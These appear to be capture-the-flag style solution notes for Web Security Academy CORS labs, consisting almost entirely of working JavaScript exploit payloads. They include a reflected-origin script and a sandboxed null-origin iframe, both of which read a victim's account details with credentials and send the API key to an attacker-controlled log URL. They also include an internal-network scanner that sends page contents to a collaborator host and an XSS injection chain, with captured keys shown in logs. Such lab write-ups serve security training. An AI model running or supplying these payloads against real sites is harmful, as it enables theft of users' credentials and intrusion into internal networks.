### CORS vulnerability with basic origin reflection

```
<script>
    fetch('https://acc51f361e18076480b18f7400cb00e1.web-security-academy.net/accountDetails', {
        credentials: 'include',
    })
        .then(response => response.json())
        .then(data => {
            location = '/log?key=' + data.apikey;
        });

</script>
```

### API Key Via Log
```
"GET /log?key=C6jmr5ha0rCuLJLJwF2Advyo5Ww6jjEi HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/888822"
```
### trusted null origin
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,
<script>
    fetch("https://ac261fc01eaf53ac8000046f00a70074.web-security-academy.net/accountDetails", {
        credentials: "include",
    })
        .then(response => response.json())
        .then(data => {
            location = "https://ac351fc01ef95355807a045a01ec00f8.web-security-academy.net/log?key=" + data.apikey;
        });
</script>'></iframe>
```
```
"GET //log?key=FLgt9zxG64IV2d0DKYDm3pI2kRGtyY6g HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/885332"
```

###  internal network pivot attack
```
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script>
```
```
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
    fetch(url).then(r=>r.text().then(text=>
        {
            xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
        }
    ))
}

fetchUrl("http://192.168.0.214:8080", "http://acf71f9d1e695c8d80ac991501250022.web-security-academy.net");
</script>
```
